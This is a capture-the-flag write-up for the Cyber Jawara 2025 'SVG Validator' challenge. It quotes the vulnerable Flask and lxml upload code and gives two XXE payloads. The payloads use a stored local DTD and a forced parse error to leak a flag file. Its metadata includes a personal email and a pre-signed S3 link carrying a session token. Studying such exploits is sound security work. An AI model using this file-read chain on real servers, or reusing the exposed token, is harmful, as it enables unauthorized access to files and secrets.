---
id: 17948583-e65d-8037-bf0f-d573b2499823
title: >-
  Read the file with lxml.etree that Vulnerable to XXE, include the local DTD,
  and generate an error to read the Flag: Cyber Jawara National 2025 Quals SVG
  Validator
created_time: 2025-01-12T10:59:00.000Z
last_edited_time: 2025-05-22T09:16:00.000Z
cover_image: ./imgs/mita-miside-oshinokodance-oshinokodance_bVLkwBdw.gif
icon_emoji: 🫡
categories:
  - XXE
verification:
  state: unverified
  verified_by: null
  date: null
page: >-
  Read the file with lxml.etree that Vulnerable to XXE, include the local DTD,
  and generate an error to read the Flag: Cyber Jawara National 2025 Quals SVG
  Validator
owner:
  - object: user
    id: ee7aeeeb-cd0d-4cbb-9e7e-109320ff16fa
    name: Dimas
    avatar_url: >-
      https://s3-us-west-2.amazonaws.com/public.notion-static.com/fab4bcf0-36ea-4bd6-8847-f18b157387da/92920739.png
    type: person
    person:
      email: dimasmaulana0305@gmail.com
_thumbnail: ./imgs/mita-miside-oshinokodance-oshinokodance_bVLkwBdw.gif

---

# Description

A simple SVG validator.

[image](https://prod-files-secure.s3.us-west-2.amazonaws.com/39d1be85-e7c6-4263-a666-a42da95a70df/8d6a70b2-6c3c-410a-9ddb-5303e731a08d/svg-validator.zip?X-Amz-Algorithm=AWS4-HMAC-SHA256\&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD\&X-Amz-Credential=ASIAZI2LB466SVVD4SPM%2F20250524%2Fus-west-2%2Fs3%2Faws4_request\&X-Amz-Date=20250524T044354Z\&X-Amz-Expires=3600\&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEEUaCXVzLXdlc3QtMiJIMEYCIQD42G0gjqahrI0LGMURDLtcozBRj0Zi1z5RtCC3jz7rEgIhAOkjZn6BWWPx0ammVz1ig%2F1veeAwbMUgwe6ogbBnZAiKKogECP3%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQABoMNjM3NDIzMTgzODA1Igyc9DU2HO8S5xJs%2FoQq3AMDW%2F4WdAmw74JUGPm7J6mQ3o9EoSm0DxpgNG7ShIGkLITvbxrMB2vQ1aBsEKKjkuLJJgKTkZAo9Z7%2F%2BFG3%2B%2Bnyl1YdxAT2ABJCF%2B8KIXKL3%2BeAy1dCwDHLBi1suFD9yfyCVtxsFgRXfk82YVXL6k7uabWywDSLZ3AK0mByFV5ahuq7yuFNuXsATpGfKBSOiLJBUHqoTO05u%2F%2BnY3tPL3aa4otkRCO33xt1DUPv6wVo5MrOnliUjMrOxbuG2X324KgWzl8Alz9pFD5S%2B%2Fk09HHm1XVSh2WjhSMLitbcDCOM78yFNhocO67fYnLU0SypBu3uHHG6Mnzoh5AQN7KH5ouQ4OIYBzY5rZ6e%2B2dCCuMzv8k%2BPJloM7%2FeN3W3xiVaKy8klO%2Ba%2BSxouCiZb5KAlMTGhBEeOZ096Z%2BWLml4t5llgF8Nf%2FIsX5Bs8ybwVmvZ7dTCi7%2F8IJ%2FapyFthlPSnKGkM5AIj5dIDGlLLg5HOilB6PKNC%2FfrjjG%2BE3cpz2xIuJ6VpjnyI3Otz454xqm7Vj3TjSWKhji0k0AFryV8zFjAaHo2WDryT0yZQRcwXUK6VYucTMEFTOB1ZVHr9zHw5Esb6PhFcd88SRu5WmB6zx%2F5zCpN9cezm5FHL7Y29jDaksXBBjqkAXLdx6p4te7q4VIUBQV2UOXdDTBkGGdWlLtm9wys8kvAZ5PU%2B3PUk8e9VAuz%2FF%2Fp6O%2FnzGMjsvJr%2BNX5T%2BNVTfYVIPWL5yFQJR%2BB1JLzkEymCeU6J0MEafhsdlsWPAkVN7ppz2pET3quRGnKt8YZXPTuzb7NHqcUZs4YFgsjqHfDb1Er0GL6MftdWAoUo2Z8CeHnCJpShaSMDp%2BDgy609r6xWaY7\&X-Amz-Signature=ea3bdca407ff359f6f5a66ef4eac3482c568c469a6c93a580fbf42c715859d33\&X-Amz-SignedHeaders=host\&x-id=GetObject)

# Exploit

In order to gain Arbitrary File Read, we will exploit the XXE vulnerability in the `lxml.etree`. We must introduce an error in the XML since we cannot read the flag information directly because we do not receive the rendered XML's direct output.

For this task, we have to save our local file on the server, but we can't because it will be deleted after validation. However, we can store and get around the `os.remove` due of a logical error:

```python
        valid = is_valid_svg(file_path)
        os.remove(file_path)

        return jsonify({'valid': valid})
    except Exception as e:
        return jsonify({'error': str(e)}), 500
```

Therefore, by making the `is_valid_svg` function throw an error, we can avoid the `os.remove` step and ensure that the file stored on the server will remain intact even if our `is_valid_svg` method gives an error.

```python
def is_valid_svg(file_path):
    tree = etree.parse(file_path)
    root = tree.getroot()
    return root.tag.endswith('svg')

@app.route('/upload', methods=['POST'])
def upload_file():
    if 'file' not in request.files:
        return jsonify({'error': 'No file part'}), 400

    file = request.files['file']

    if file.filename == '':
        return jsonify({'error': 'No selected file'}), 400

    if not allowed_file(file.filename):
        return jsonify({'error': 'Invalid file extension'}), 400

    file_path = ''

    try:
        extension = file.filename.rsplit('.', 1)[1].lower()

        filename = hashlib.sha256(
            (file.filename + str(secrets.token_hex)[:16]).encode('utf-8')
        ).hexdigest() + '.' + extension
        file_path = os.path.join(app.config['UPLOAD_FOLDER'], filename)
        file.save(file_path)

        valid = is_valid_svg(file_path)
        os.remove(file_path)

        return jsonify({'valid': valid})
    except Exception as e:
        return jsonify({'error': str(e)}), 500
```

We now need to keep one XML file on the server so that we can add it later to cause an error that will leak the flag. This is the first file we upload:

testing.svg

```python
<!ENTITY % content SYSTEM "file://app/flag.txt">
	<!ENTITY % test '<!ENTITY &#x25; file SYSTEM "file:///tmp/%content;">'>
 	%test;
```

due to the etree.Parse will automatically avoid the os.remove function and throw an error since it does not recognize this as valid XML. The second file is as follows:

file.svg

```python
<!DOCTYPE root [
	<!ENTITY % dtd SYSTEM "file:///tmp/051880fbfbd0b3f38ec3244610784c3a9c258f755039bb7cf1311fd1fc843f2d.svg">
 	%dtd;
]>
<svg></svg>
```

The file in tmp is a file that we upload before, the hash isn’t random and same each iteration because their filename isn’t use secret.token\_hex function properly:

```python
        filename = hashlib.sha256(
            (file.filename + str(secrets.token_hex)[:16]).encode('utf-8')
        ).hexdigest() + '.' + extension
```

So after we uploaded that two file we will get the flag:

![](./imgs/image_UQYv5eO4.png)
